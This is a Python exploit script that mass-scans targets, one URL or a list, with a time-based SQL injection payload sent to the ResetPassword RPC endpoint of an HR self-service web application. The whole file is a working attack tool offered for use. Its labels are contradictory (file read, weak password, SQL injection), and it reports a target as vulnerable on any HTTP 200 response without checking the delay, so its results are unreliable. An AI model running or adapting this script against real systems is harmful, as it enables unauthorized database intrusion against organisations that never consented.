# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
from multiprocessing.dummy import Pool

import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                            tag: this is a  某友CRM存在任意文件读取 poc                                       
                                        @version: 1.0.0   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target
    else:
        target = target + "/"
    url = target + "hrss/dorado/smartweb2.RPC.d?__rpc=true"

    headers = {
        "Pragma": "no-cache",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept": "*/*",
        "Referer": f"{target}/hrss/ResetPwd.jsp",
        "Cookie": "JSESSIONID=C2CFFE1429FF812ABF357C2BDD5BDBC1.server; JSESSIONID=8FEF31DBA1E3188706B14123C6D1CE87.server",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Content-Length": "672"
    }
    data = "__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=%3Crpc%20transaction%3D%2210%22%20method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset%20type%3D%22Custom%22%20id%3D%22dsResetPwd%22%3E%3Cf%20name%3D%22user%22%3E%3C/f%3E%3Cf%20name%3D%22ID%22%3E%3C/f%3E%3C/dataset%3E%3C/def%3E%3Cdata%3E%3Crs%20dataset%3D%22dsResetPwd%22%3E%3Cr%20id%3D%2210009%22%20state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1';WAITFOR DELAY '0:0:6'--%3C/v%3E%3Cv%3E11111111111111111111%3C/v%3E%3C/n%3E%3C/r%3E%3C/rs%3E%3C/data%3E%3Cvps%3E%3Cp%20name%3D%22__profileKeys%22%3EfindPwd%253B15b021628b8411d33569071324dc1b37%3C/p%3E%3C/vps%3E%3C/rpc%3E&1700109885028"

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=15)
        # print(response.request.body)
        # print(response.content)

        if response.status_code == 200:
            print(f"[+] {target} 存在 sql ")
        else:
            print(f"[-] {target} 未发现 sql")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
